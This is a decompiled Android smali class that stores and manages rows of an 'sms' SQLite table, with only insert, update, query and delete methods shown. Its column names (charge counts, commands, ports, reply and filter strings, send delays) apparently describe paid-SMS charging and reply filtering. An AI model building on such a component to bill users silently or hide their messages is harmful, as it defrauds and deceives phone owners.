.class public Lorg/zzf/core/b/k;
.super Ljava/lang/Object;


# static fields
.field private static a:Lorg/zzf/core/b/k;


# direct methods
.method private constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static a()Lorg/zzf/core/b/k;
    .locals 1

    sget-object v0, Lorg/zzf/core/b/k;->a:Lorg/zzf/core/b/k;

    if-nez v0, :cond_0

    new-instance v0, Lorg/zzf/core/b/k;

    invoke-direct {v0}, Lorg/zzf/core/b/k;-><init>()V

    sput-object v0, Lorg/zzf/core/b/k;->a:Lorg/zzf/core/b/k;

    :cond_0
    sget-object v0, Lorg/zzf/core/b/k;->a:Lorg/zzf/core/b/k;

    return-object v0
.end method


# virtual methods
.method public a(Landroid/content/Context;)Ljava/util/List;
    .locals 5

    const-string v0, "lock"

    monitor-enter v0

    :try_start_0
    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    invoke-static {p1}, Lorg/zzf/core/b/l;->a(Landroid/content/Context;)Lorg/zzf/core/b/l;

    move-result-object v1

    invoke-virtual {v1}, Lorg/zzf/core/b/l;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuffer;

    invoke-direct {v2}, Ljava/lang/StringBuffer;-><init>()V

    const-string v3, " select charge_count , cmd , is_second , port , reply_content , reply_end_str , reply_start_str , second_port , second_type , sms_delay_time , _ID , filter_info , filter_port , second_info , is_sms , is_fuzzy"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v3

    const-string v4, " from sms"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    invoke-virtual {v2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    invoke-interface {v2}, Landroid/database/Cursor;->moveToFirst()Z

    invoke-interface {v2}, Landroid/database/Cursor;->getCount()I

    move-result v3

    if-lez v3, :cond_1

    :cond_0
    new-instance v3, Lorg/zzf/core/d/aa;

    invoke-direct {v3}, Lorg/zzf/core/d/aa;-><init>()V

    const/4 v4, 0x0

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->d(I)V

    const/4 v4, 0x1

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->d(Ljava/lang/String;)V

    const/4 v4, 0x2

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->b(I)V

    const/4 v4, 0x3

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->e(Ljava/lang/String;)V

    const/4 v4, 0x4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->i(Ljava/lang/String;)V

    const/4 v4, 0x5

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->h(Ljava/lang/String;)V

    const/4 v4, 0x6

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->g(Ljava/lang/String;)V

    const/4 v4, 0x7

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->f(Ljava/lang/String;)V

    const/16 v4, 0x8

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->c(I)V

    const/16 v4, 0x9

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->e(I)V

    const/16 v4, 0xa

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->a(I)V

    const/16 v4, 0xb

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->c(Ljava/lang/String;)V

    const/16 v4, 0xc

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->b(Ljava/lang/String;)V

    const/16 v4, 0xd

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->j(Ljava/lang/String;)V

    const/16 v4, 0xe

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->a(Z)V

    const/16 v4, 0xf

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-virtual {v3, v4}, Lorg/zzf/core/d/aa;->f(I)V

    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_0

    :cond_1
    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    invoke-virtual {v1}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    const-string v1, "lock"

    monitor-exit v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-object v0

    :catchall_0
    move-exception v0

    const-string v1, "lock"

    monitor-exit v1

    throw v0
.end method

.method public a(Landroid/content/Context;I)V
    .locals 4

    const-string v0, "lock"

    monitor-enter v0

    :try_start_0
    invoke-static {p1}, Lorg/zzf/core/b/l;->a(Landroid/content/Context;)Lorg/zzf/core/b/l;

    move-result-object v0

    invoke-virtual {v0}, Lorg/zzf/core/b/l;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    const-string v2, "sms"

    const-string v3, "_ID = ?"

    invoke-virtual {v0, v2, v3, v1}, Landroid/database/sqlite/SQLiteDatabase;->delete(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)I

    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    const-string v0, "lock"

    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-void

    :catchall_0
    move-exception v0

    const-string v1, "lock"

    monitor-exit v1

    throw v0
.end method

.method public a(Landroid/content/Context;Lorg/zzf/core/d/aa;)V
    .locals 6

    const-string v0, "lock"

    monitor-enter v0

    :try_start_0
    invoke-static {p1}, Lorg/zzf/core/b/l;->a(Landroid/content/Context;)Lorg/zzf/core/b/l;

    move-result-object v0

    invoke-virtual {v0}, Lorg/zzf/core/b/l;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    new-instance v1, Landroid/content/ContentValues;

    invoke-direct {v1}, Landroid/content/ContentValues;-><init>()V

    const-string v2, "charge_count"

    invoke-virtual {p2}, Lorg/zzf/core/d/aa;->m()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p2}, Lorg/zzf/core/d/aa;->d()I

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const-string v3, "sms"

    const-string v4, "_ID = ? "

    invoke-virtual {v0, v3, v1, v4, v2}, Landroid/database/sqlite/SQLiteDatabase;->update(Ljava/lang/String;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I

    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    const-string v0, "lock"

    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-void

    :catchall_0
    move-exception v0

    const-string v1, "lock"

    monitor-exit v1

    throw v0
.end method

.method public a(Lorg/zzf/core/d/aa;Landroid/content/Context;)V
    .locals 4

    const-string v0, "lock"

    monitor-enter v0

    :try_start_0
    invoke-static {p2}, Lorg/zzf/core/b/l;->a(Landroid/content/Context;)Lorg/zzf/core/b/l;

    move-result-object v0

    invoke-virtual {v0}, Lorg/zzf/core/b/l;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    new-instance v1, Landroid/content/ContentValues;

    invoke-direct {v1}, Landroid/content/ContentValues;-><init>()V

    const-string v2, "charge_count"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->m()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    const-string v2, "cmd"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->e()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "is_second"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->g()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    const-string v2, "port"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->f()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "reply_content"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->l()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "reply_end_str"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->k()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "reply_start_str"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->j()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "second_port"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->i()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "second_info"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->o()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "second_type"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->h()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    const-string v2, "sms_delay_time"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->n()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    const-string v2, "filter_info"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->c()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "filter_port"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->b()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "is_sms"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->a()Z

    move-result v3

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Boolean;)V

    const-string v2, "is_fuzzy"

    invoke-virtual {p1}, Lorg/zzf/core/d/aa;->p()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    const-string v2, "sms"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3, v1}, Landroid/database/sqlite/SQLiteDatabase;->insert(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J

    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    const-string v0, "lock"

    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-void

    :catchall_0
    move-exception v0

    const-string v1, "lock"

    monitor-exit v1

    throw v0
.end method

.method public b(Landroid/content/Context;)V
    .locals 4

    const-string v0, "lock"

    monitor-enter v0

    :try_start_0
    invoke-static {p1}, Lorg/zzf/core/b/l;->a(Landroid/content/Context;)Lorg/zzf/core/b/l;

    move-result-object v0

    invoke-virtual {v0}, Lorg/zzf/core/b/l;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    const-string v1, "sms"

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-virtual {v0, v1, v2, v3}, Landroid/database/sqlite/SQLiteDatabase;->delete(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)I

    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    const-string v0, "lock"

    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-void

    :catchall_0
    move-exception v0

    const-string v1, "lock"

    monitor-exit v1

    throw v0
.end method
